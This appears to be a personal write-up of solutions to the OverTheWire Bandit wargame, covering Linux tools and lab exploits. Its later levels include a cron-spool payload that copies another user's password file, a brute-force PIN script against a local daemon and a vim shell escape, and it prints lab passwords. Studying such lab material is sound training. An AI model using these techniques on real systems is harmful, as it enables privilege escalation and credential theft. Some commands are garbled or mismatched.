# About
This folder contains structures solutions and reference for the exercises contained on [bandit.overthewire](https://overthewire.org/wargames/bandit/).

Documented answers to the non-trivial questions can be found below, and all the passwords are available in the workspace file, and more detailed solutions can be read in the answers.md file.

# Key Learning Takeaways
- Linux utilities
  - `find` to find certain files
  - `file` to snoop what exactly a file is
  - `netcat` and `nmap`: setting up simple daemons and establishing connections
  - `sort, uniq, diff` and `grep`

- Sessions
  - `ssh`
    - using keys instead of passwords with -i
  - `openSSL`

- Writing bash scripts
  - changing file properties with chmod
  - changing ownership with chown
  - bash globals: $0

- escaping to shell with vim
  - :set, :shell


## Level 5 - 6
#### Learning outcome: Using find to filter by file type.
Here we are looking for a file with the properties:
- human-readable
- 1033 bytes in size
- not executable

The following command therefore means "search the root directory for anything owned by user bandit7 and group bandit6 that is 33 bytes in size.

```find / ```


## Level 6 - 7
#### Learning outcome: Using find to filter by file type.
Here we are looking for a file with the properties:
- owned by user bandit7
- owned by group bandit6
- 33 bytes in size

The following command therefore means "search the root directory for anything owned by user bandit7 and group bandit6 that is 33 bytes in size.

```find / -user bandit7 -group bandit6 -size 33c```

## Level 8-9
#### Learning outcome: Using sort and uniq.
We are looking for a line that occurs only once. The hinted at `uniq` utility would obviously help this problem. However if you try using it you'll get a whole bunch of lines.

Reading the manual page further reveals that lines are only considered unique if their adjacent lines are different. Therefore for uniq to do what we want it to do, we have to sort the file first.

`sort data.txt | uniq -u`

## Level 10
#### Learning outcome: Text search with grep
Here we need to scan a file for a human readable string beginning with several '=' characters.
`strings data.txt | grep -e ==`

## Level 11-12
#### Learning outcome: String translation with tr mappings
`cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'`

## Level 12-13
#### Learning outcome: Reverse engineering using file types
`xxd -r`
`gzip -d`
`bzip2 -d`
`tar -x`

## Level 13-14
#### Learning outcome: SSH with private key
`ssh -i file bandit15@bandit.labs.overthewire.org -p 2220`

## Level 15-16
#### Learning outcome: Connecting with SSL
`openssl s_client -connect localhost:30001`

## Level 16-17
#### Learning outcome: Nmap
`nmap localhost -p 31000-32000`

## Level 18-19
`cat ~/readme | ssh bandit18@bandit.labs.overthewire.org -p 2220`

## Level 19-20
`./ cat /etc/bandit_pass/bandit20`

## Level 20-21
Here we need to set up a process to listen on a port of our choosing and return the previous level's password through stdout. This can be done with a backgrounded netcat process with the -l flag:
```
echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l localhost -p 13337 &
./script 13337
```

# Exploiting scheduled tasks
## Level 21 - 22
Some light reading reveals that cron is a job scheduling utility that reads crontab documents for instructions on when to run tasks. A great tutorial is available [here](https://www.youtube.com/watch?v=QZJ1drMQz1A).

Printing the `cat /etc/cron.d/cronjob_bandit22` reveals that it runs the `/usr/bin/cronjob_bandit22.sh` script every minute of every day of every...(etc) as a background process. Printing this script gives the output:
```
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
which puts the password for bandit22 into the labelled temp file. Therefore printing the temp file gives us the password.

## Level 22 - 23
Following the same workflow as the previous problem, we see now that the executed script is slightly obfuscated:

```
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

To reverse engineer it, we run the script in terminal:
`. /usr/bin/cronjob_bandit23.sh`
which produces the following output:
```
Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
```

when run by bandit23 as a cronjob, the phrase "I am user bandit23" is hashed and used as the name of the file that the password is stored in. All we need to do now is get the name of that file by doing 
```
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```
And we have the password.

## Level 23 - 24
As usual, we find the script to be executed, and it looks like this:

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

We're going to set up a bash script and try getting it to run. Let's do all this in /tmp/myworkspace. As usual, take care to create a workspace directory that doesn't already exist (or you could remove it first). Now, we create a `payload.sh` with the following lines:
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/dl5215/stealpw
```

Next, we create the following script to deliver our payload to the desired directory:
```
#!/bin/bash
chmod 777 payload.sh                # Gives everyone execute permissions for our payload
touch stealpw                       # Makes the file for us to dump the password
chmod 666 stealpw                   # Gives everyone write permissions for the file
cp payload.sh /var/spool/bandit24/  # Delivers the payload.
```

Once we wait a minute for the payload to be executed by the cron scheduler, we have our password! (check it by continuously `cat`-ing or `find`-ing our payload, since the cron job deletes it after execution).

## Level 24-25
We need to make a bash script to brute force the passwords. We start by making a bash script `exploit.sh` in a `/tmp/somedirectory` location. Fortunately, bash has some great syntactic sugar for generating the pincodes:

```
#!/bin/bash
touch combi1.txt
for i in {0000..9999};
do
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done > combi1.txt
cat combi1.txt | nc localhost 30002 | grep -v Wrong
```

To make absolutely certain that this executes as a bash script (such that all the syntax is properly executed), we do
```
chmod 777 exploit.sh
./exploit.sh
```

One can also ensure the set notation in the braces is correctly parsed by doing set

This level was ABSOLUTE CANCER. While I had the methodology correct at quite an early stage, I spent a good hour just trying to work around not getting the daemon to time out. My solution was matching all of the other ones online, so I don't know why this was the case. I avoided the timeout by splitting the brute force combinations into 3 files. Refer to exploit24.sh for the implementation.

## Level 25-26-27
It has been hinted at the the shell is not in /bin/bash. Let's first isolate the command that we will use to get into bandit26:

ssh bandit26@localhost -i bandit26.sshkey

We're going to now look for the line in /etc/passwd for bandit26 because it will show us what shell is running:

```
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```
Therefore we see that our attack vector is the more command. Resizing the terminal such that it is small enough for more to be used to show us the bandit logo, we now press v to launch the default editor, vim. Now we can use the vim command :e to view the file we choose, which we will obviously perform on /etc/bandit_pass/bandit26.

That's not quite what we wanted to do though, since we already can log in to bandit26. To escape to the shell, we're going to use some in built commands by vim `:set shell=/bin/bash` and `:shell` which are pretty self explanatory.

Now that we're in the shell, we see a technique we've encountered before: using a setuid executable. We'll just use this to get the password:
```
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```

## Level 28-29
Printing the file in the repo, we see that it has been censored. However, doing `git log` shows 

```
bandit28@bandit:/tmp/dl5215/repo$ git log
commit 073c27c130e6ee407e12faad1dd3848a110c4f95
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    fix info leak

commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    add missing data

commit b67405defc6ef44210c53345fc953e6a21338cc7
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    initial commit of README.md
```

so `git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb` to set HEAD to add missing data and printing the README file gets us the password.

# Level 29-30
Following the same print method, we see now that it says that there are no branches in production. We want to inspect the branches to see if there are any other branches. Indeed by doing `git branch -a`, we see that there is a dev branch, which we can checkout, pull and print the README to crack.

# Level 30
Password was hidden in the tags ._.

# Level 31
All we need to do is follow the instructions. However, .txt files are in the gitignore, which we can remove. 

Of note here: how did they configure a git server to check the file and give the password?

# Level 32 - 33
I started by assuming that the shell would be going through some translation, so a bit of testing revealed that special characters like $%^& did not get translated. Only lowercase letters resulted in uppercase. I therefore wanted to use bash variables to change the shell back to /bin/bash, for example:
```
var="/BIN/BASH"     # makes $VAR with the string
SHELL=${var,,}      # Turns all letters in string to lowercase
```
However, this just resulted in a bad substitution. This could be because the interactive uppercase shell is running dash and not bash, which doesn't support this string syntax. The solution happily enlightened me that $0 contained exactly what I was aiming to do anyway, so given that this is an interactive shell, simply putting that variable in brings us back to the original shell.